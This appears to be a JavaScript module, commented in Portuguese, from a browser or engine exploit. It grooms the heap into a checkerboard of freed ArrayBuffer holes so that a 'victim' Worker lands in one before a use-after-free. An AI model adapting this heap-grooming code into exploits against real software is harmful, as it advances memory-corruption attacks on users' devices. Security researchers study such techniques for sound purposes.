import { log } from './utils.mjs';

var grooming_stash = [];

export function prepare_checkerboard_heap(size) {
    log(`HEAP: Preparando padrão Checkerboard para 0x${size.toString(16)}...`, "info");
    
    try {
        grooming_stash = []; // Limpa anterior
        
        // Aloca 2000 itens
        let temp = [];
        for (let i = 0; i < 2000; i++) {
            let ab = new ArrayBuffer(size);
            temp.push(ab);
        }

        // Cria buracos (Libera 1 a cada 2)
        // Padrão: [Ocupado] [Livre] [Ocupado] [Livre]
        // O Worker 403 (Vítima) deve cair num desses buracos livres antes de ser liberado
        let holes = 0;
        for (let i = 0; i < temp.length; i += 2) {
            temp[i] = null; // Libera para o GC
            holes++;
        }
        
        // Mantém os ocupados vivos para evitar coalescência total
        grooming_stash = temp.filter(x => x !== null);
        
        log(`HEAP: ${holes} buracos criados. Memória fragmentada.`, "success");
    } catch (e) {
        log("HEAP ERRO: " + e, "fail");
    }
}

export function clear_heap() {
    grooming_stash = [];
}
